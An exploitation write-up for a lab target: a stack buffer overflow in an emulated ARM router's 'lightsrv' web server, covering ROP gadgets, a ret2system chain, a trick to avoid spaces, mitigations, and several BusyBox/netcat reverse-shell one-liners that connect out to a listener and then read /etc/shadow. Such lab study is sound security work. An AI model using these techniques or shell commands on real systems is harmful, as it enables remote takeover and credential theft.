# Vulnerability 3: Stack Buffer Overflow in `lightsrv`

The web server at `/usr/bin/lightsrv` is vulnerable to a stack buffer overflow ([CWE-121](https://cwe.mitre.org/data/definitions/121.html))
in the request parser.

## Impact

The vulnerable webserver runs at root and is accessible over port 8080 in the default configuration.
The vulnerability can be triggered without authentication.
Since stack canaries and ASLR are not enabled, it can be trivially exploited to gain remote code execution.

## Details

The vulnerability exists in `handle_req`, whose job is to parse received HTTP requests. The relevant pseudocode is as
follows:

```c
int handle_req(int extSocket, char request[4100], size_t requestLen)
{
  char requestedFile[0x800];

  if (memcmp(request, "GET", 3) == 0) {
    char* reqBody = (char *)((int)request + 4);
    followingSpace = (undefined *)memchr(reqBody,0x20,requestLen - 4);
    if (followingSpace == (undefined *)0x0) {
      send_error(extSocket,400,"Bad Request");
    }
    else {
      *followingSpace = 0;
      
      [...]
      
      strcpy(requestedFile, "/www/docroot");
      strcat(requestedFile, reqBody);
      int file = fopen(requestedFile,"r");
      if (file == (FILE *)0x0) {
        send_error(extSocket,0x194,"Not Found");
      }
      else {
        [...reply with the file...]
      }
    }
  }
  else {
    send_error(extSocket,0x1f5,"Not Implemented");
  }
  return;
}
```

This is a textbook `strcat()` overflow. The user-controlled `request` buffer is `0x1000` bytes long, so the string
`reqBody` can be up to `0x99c` bytes long. This string is then concatenated to a stack buffer (`requestedFile`) that's
only `0x800` bytes long. Since this function doesn't have a stack cookie, this can be trivially abused for code
execution.

## Exploitation

Exploitation of this bug is trickier than the past two overflows. There are two reasons for this:
- The overflow happens in a `strcat()` instead of a `read()`, so our payload cannot contain null bytes.
- The overflowing string is cut off at its first space. Thus the byte `0x20` also can't show up in our payload.

The former concern is immediately problematic. One of the main ROP gadgets we've been using (the `mprotect()` stand-in)
is at address `0x40001ecc`. As this address contains a null byte, we can't use it as part of our chain anymore.
Furthermore, since this is the only call to `mprotect()` I've found, this rules out using shellcode. Instead, we will
fall back to the time-honored return to `system()`.

### The `ret2system` ROP Chain

In order to perform a `ret2system`, our ROP chain needs to do two things:

- Pop the address of our shell command into `r0`
- Return (you guessed it) to `system()`

We will find the first gadget using `ropper`. Actually, we already found it while exploiting the first `lightsrv`
overflow:

```
┌──(cd80㉿kali)-[~/…/emux/DV-ARM/rootfs-arm/lib]
└─$ ropper                                        
(ropper)> file libgcc_s.so.1
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] File loaded.
(libgcc_s.so.1/ELF/ARM)> search /1/ pop
[INFO] Searching for gadgets: pop

[INFO] File: libgcc_s.so.1
0x00004da4: pop {r0, pc};
[...]
```

Since `libgcc_s.so.1` is loaded at `0x40018000` (again, see the first writeup), this gadget lies at `0x4001cda4`.
Thankfully, this address doesn't have null bytes. Thus our first task is already complete: we can control the argument
to `system()`.

Next, we need to find the address of `system()`. This is a bit trickier; for the life of me, I couldn't find `system()`
in any shared object loaded by `lightsrv`. Thankfully, the author has *helpfully* included a couple calls to it in the
`handle_led_cmd` function. Thus we can just look for `system()`'s entry in `lightsrv`'s PLT. Using Ghidra, we find it:

```
0001093c 00 c6 8f e2     adr        r12,0x10944
00010940 11 ca 8c e2     add        r12,r12,#0x11000
00010944 c8 f7 bc e5     ldr        pc=><EXTERNAL>::system,[r12,#0x7c8]!=>-><EXTER   = 00023024
```

Thus the return address for `system()` will be `0x001093c`.

"But wait," you might say. "Doesn't that contain a null byte?"

Astute observation, I would respond. Thankfully, it doesn't matter *too* much for our purposes. Calling `system()` will
be the last thing we do, so it's actually fine if our overflow stops here. In a production exploit, this would be
suboptimal, as the server would surely crash afterwards; however, for our purposes, this is just fine.

### Crafting The Shell Command

Now that we can call `system()`, we need a command to call it on. As per the last two exploits, we will aim for a
reverse shell.

This is where the second constraint threatens to sink us. Since the only large chunk of attacker-controlled data in
memory during the exploit is our HTTP request, we need to include our shell command in this request. However, as
previously discussed, **our HTTP request cannot contain spaces!** Thus we need to find a way to encode a shell command
without spaces.

(Funnily enough, this is not the first time I've come across this problem in a router exploit...)

The solution is thankfully simple. Archived in the annals of the internet, we find that shells interpret spaces and tabs
as identical. **Thus we can simply replace all spaces in our command with tabs and bypass the second constraint.**

With this tab trick, we can execute any shell command we want. Now to find a reverse shell command...

### BusyBox Reverse Shells Are Weird

We'll start, as always, with the simplest option. For reverse shells, this is usually a `netcat` command:

```
nc TARGET_IP:TARGET_PORT -e /bin/ash
```

Checking on the router, we find that its `busybox` installation comes with netcat! However, we immediately find that
it's a thoroughly crippled `netcat`:

```
/ # nc TARGET_IP:TARGET_PORT -e /bin/bash
BusyBox v1.23.2 (2021-10-14 18:26:48 IST) multi-call binary.

Usage: nc [IPADDR PORT]

Open a pipe to IP:PORT
```

This is typical on embedded systems. We'll need another way to pass data between `netcat` and `ash`.

Thankfully, this is not a new problem. The typical solution is to create a named pipe and send the data in a loop:

```
netcat -> pipe -> ash -> pipe -> netcat
```

The solution you'll find on the internet is

```
rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/ash -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
```

However, I ran into problems with this solution.  The crux of the issue is that our command cannot be the last thing in
our overflow; as previously mentioned, that has to be our ROP chain. Thus our command will be followed by
a bunch of throwaway characters. To prevent these characters from messing with our actual command, we need to end it
with a semicolon:

```
rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/ash -i 2>&1|nc 10.0.0.1 4242 >/tmp/f;NONSENSENONSENSENONSENSE
```

This causes the reverse shell to run in the background. Unfortunately, since `/bin/ash` will continue to try to read
from `stdin`, it will crash with a TTY error.

To avoid this problem, we change the main loop slightly to pass `stdin` through our pipe:

```
rm -f /tmp/f;mknod /tmp/f p;/bin/busybox ash 0</tmp/f | nc 192.168.100.1 52608 > /tmp/f;
```

This successfully spawns a reverse shell even when run in the background.

### Triggering The Bug

Our work is mostly done. All we need to do now is reach the vulnerable code path.

We can steal most of our solution from the second overflow. This includes the two-request technique: one containing the
Content-Length, and one containing the rest of our payload. The only difference is that `handle_req()` also expects
there to be a space somewhere in our request. We can just stick this onto the end; since there will be null bytes before
it, it won't affect our overflow.

All we have to do then is follow `handle_req()` in GDB to find where our command will be in memory, pass that
into the ROP chain, and...

### Assuming Direct Control

1) Start the router using EMUX, forwarding the vulnerable port 8080 to 28080.
2) In another tab, open an EMUX terminal and start the listener: `nc -lvp 52608`
3) Run the exploit script: `python main.py`
4) In the listener tab, enter the password `cd80`
5) `cat /etc/shadow`, etc.

## Mitigations

The root cause of this exploit is that the length of the requested file is not checked. Since the request buffer is much
larger than the file buffer, this allows us to overflow the smaller filename buffer. To fix this,
the `strcat()` should be replaced with a `strncat()` with the apprpriate size.

Compiling this binary with stack canaries would also neuter this bug, and enabling ASLR would make it much more
frustrating (though, since the service restarts itself, not impossible!) to exploit.

